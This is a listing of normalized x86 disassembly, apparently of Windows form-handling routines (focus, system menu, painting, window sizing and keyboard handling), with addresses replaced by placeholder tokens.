mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
call sub_403a8c
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_4507d8
mov dx 0xb01a
call sub_461b90
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403a8c
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_44b16c
sub_465ee4
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_44b16c
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_4507d8
push eax
call SetFocus
mov eax ebx
call sub_4507d8
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_465f34
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_44b16c
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_465fe8
mov eax esi
call sub_465ee4
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_450c00
mov edx eax
mov eax esi
call sub_465b2c
sub_465f98
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_464bb0
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_44b16c
mov eax ebx
call sub_464bb0
mov edx esi
call sub_465f98
sub_465fe8
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_45e3b4
mov edx esi
call sub_45e398
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_466090
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
sub_4660dc
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_466090
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_46610c
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_466090
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_466178
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_424164
xor eax eax
push ebp
push sub_466226
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_424618
xor eax eax
push ebp
push sub_466203
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403450
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46620a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_424618
retn
sub_466234
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_464bb0
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_464be4
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403450
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_44fa68
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_464c30
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403450
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_4662d4
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4507d8
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_4507d8
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_46615c
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_4507d8
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_44e930
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_466352
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_423cc8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_4663b4
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4507d8
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_44ebf4
pop edi
pop esi
retn
sub_466400
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4507d8
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_4664fc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_464f24
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_466400
pop ecx
sub_466530
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_44b688
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4507d8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4507d8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4507d8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_44a660
pop esi
pop ebx
retn
sub_4665c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_44f9f4
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_4507d8
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_45ddd4
sub_466620
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_44ea90
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_45d7e8
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_46666c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_45e048
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4666a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_46673f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466746
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_45d748
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46b508
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_4470c8
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46b508
jmp r-xdata
sub_46676c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403450
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_4667ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40d2d8
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_4667d8
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_465f98
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_446ea0
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_466830
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44f8d8
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_469e14
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403450
sub_4668bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_4507d8
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_4507d8
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_4507d8
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_466954
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4507d8
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_465f34
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403450
sub_4669ac
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_450d0c
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_4669d8
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_465f98
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4669f4
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_45d778
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_45d778
sub_466a34
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_466a6c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403ff8
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_466aa0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_466bf1
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466bf8
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_4669f4
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_446e44
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_419174
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_449ad0
lea eax [ ebp - 0x1c ]
call sub_406e7c
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_4669f4
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_466a34
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_46b1ac
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_46b214
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_46b214
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_466a6c
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_419174
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_449ad0
lea eax [ ebp - 0x1c ]
call sub_406e7c
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_46b144
test [ esi + 0x228 ] 0x8
je r-xdata
sub_466c00
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_466c74
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_466ca0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ed3c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_464cb0
lea edx [ ebp - 0x14 ]
call sub_468478
push ebp
mov eax [ ebp - 0x4 ]
call sub_464cb0
lea edx [ ebp - 0x24 ]
call sub_468478
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_466c74
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_464cb0
lea edx [ ebp - 0x24 ]
call sub_468478
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_466c74
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_466c74
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_466c74
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_466d58
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403450
pop esi
pop ebx
retn
sub_466d7c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403450
pop esi
pop ebx
retn
sub_466da0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_44fc1c
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_450d0c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_450d0c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_466e3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4673a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_46b5f8
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_467389
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467390
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
push ebp
push sub_467290
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_4036f4#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_465fe8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44dcf8
jmp r-xdata
mov eax [ rw-data ]
call sub_4686d4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4499bc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4507d8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_4686c8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_449a00
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
